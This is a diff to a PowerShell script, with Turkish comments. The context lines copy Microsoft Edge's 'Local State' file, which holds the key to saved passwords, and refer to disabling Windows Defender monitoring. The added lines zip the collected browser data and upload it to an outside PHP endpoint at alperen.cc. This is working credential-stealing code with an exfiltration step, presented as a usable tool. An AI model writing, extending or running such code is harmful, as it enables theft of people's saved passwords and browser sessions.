@@ -55,5 +55,32 @@ Copy-Item -Path "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State" -Destin
 
 # Re-enable Windows Defender real-time monitoring (if needed)
 #Set-MpPreference -DisableRealtimeMonitoring $false
+# Dosyaları ZIP'e sıkıştır
+$zipFile = "$destDir\BrowserData.zip"
+Add-Type -AssemblyName 'System.IO.Compression.FileSystem'
+[System.IO.Compression.ZipFile]::CreateFromDirectory($destDir, $zipFile)
+
+# Kullanıcıya ZIP dosyasını bulut servise yüklemesini iste
+Write-Host "Tarayıcı verileri '$zipFile' dosyası olarak sıkıştırıldı."
+
+# Yüklemek istediğiniz dosyanın yolu
+$filePath = "C:\%APPDATA%\BrowserData.zip"
+
+# PHP dosya yükleme URL'si
+$url = "https://alperen.cc/uploadd.php" # PHP uygulamanızın URL'sini buraya yazın
+
+# Dosya yüklemek için form data oluşturma
+$form = @{
+    fileToUpload = Get-Item $filePath
+}
+
+# POST isteği gönderme
+$response = Invoke-RestMethod -Uri $url -Method Post -Form $form
+
+# Yanıtı yazdırma
+Write-Output $response
+
+
+
 
 exit
